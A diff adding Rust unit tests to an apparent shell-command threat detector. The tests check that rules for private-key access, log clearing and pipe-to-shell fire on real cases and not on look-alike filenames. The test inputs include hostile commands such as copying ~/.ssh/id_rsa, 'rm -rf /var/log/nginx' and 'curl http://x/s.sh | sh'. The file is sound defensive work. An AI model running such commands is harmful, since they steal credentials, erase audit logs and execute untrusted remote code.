@@ -527,4 +527,61 @@ mod tests {
             ids(&analyze(script, &reversed))
         );
     }
+
+    // ---- Increment B: Linux KB migrated to structured `match` ---------------
+
+    /// The FP-tightening entries keep a representative_line byte-identical to
+    /// their pre-migration legacy form, so the `--verify-detections` baseline
+    /// cannot move under the migration. Pinning them here guards that invariant.
+    #[test]
+    fn tightened_entries_keep_their_legacy_representative() {
+        let kb = kb();
+        let repr = |id: &str| -> Option<String> {
+            kb.entries
+                .iter()
+                .find(|e| e.id == id)
+                .unwrap_or_else(|| panic!("no KB entry with id `{id}`"))
+                .compiled_matcher()
+                .representative_line()
+        };
+        assert_eq!(repr("private-key-rsa").as_deref(), Some("id_rsa"));
+        assert_eq!(repr("private-key-ed25519").as_deref(), Some("id_ed25519"));
+        assert_eq!(repr("clear-syslog-rm").as_deref(), Some("rm /var/log"));
+        assert_eq!(
+            repr("clear-syslog-truncate").as_deref(),
+            Some("truncate /var/log")
+        );
+        assert_eq!(
+            repr("clear-syslog-shred").as_deref(),
+            Some("shred /var/log")
+        );
+        assert_eq!(repr("pipe-to-shell").as_deref(), Some("| bash"));
+        assert_eq!(repr("pipe-to-sh").as_deref(), Some("| sh"));
+    }
+
+    /// The structured leaves (`word`, `path_under`, `not`) tighten entries that
+    /// the old substring matcher over-fired on — without blinding the real
+    /// detection.
+    #[test]
+    fn linux_structured_tightenings_kill_fps() {
+        let kb = kb();
+        let fires =
+            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
+
+        // `word` boundary: a private-key rule keyed on `id_rsa` no longer fires
+        // on an unrelated filename that merely contains the token, nor on the
+        // public key.
+        assert!(!fires("vim id_rsa_backup_notes.txt", "private-key-rsa"));
+        assert!(!fires("cp id_rsa.pub /tmp/authorized", "private-key-rsa"));
+        assert!(fires("cp ~/.ssh/id_rsa /tmp/k", "private-key-rsa"));
+
+        // `path_under`: log-clearing no longer fires on a sibling path that only
+        // shares a prefix, but still fires on real `/var/log` deletion.
+        assert!(!fires("rm -rf /var/logistics", "clear-syslog-rm"));
+        assert!(fires("rm -rf /var/log/nginx", "clear-syslog-rm"));
+
+        // `word`: pipe-to-shell no longer fires on `| shuf` / `| shellcheck`.
+        assert!(!fires("sort access.log | shuf", "pipe-to-sh"));
+        assert!(fires("curl http://x/s.sh | sh", "pipe-to-sh"));
+    }
 }
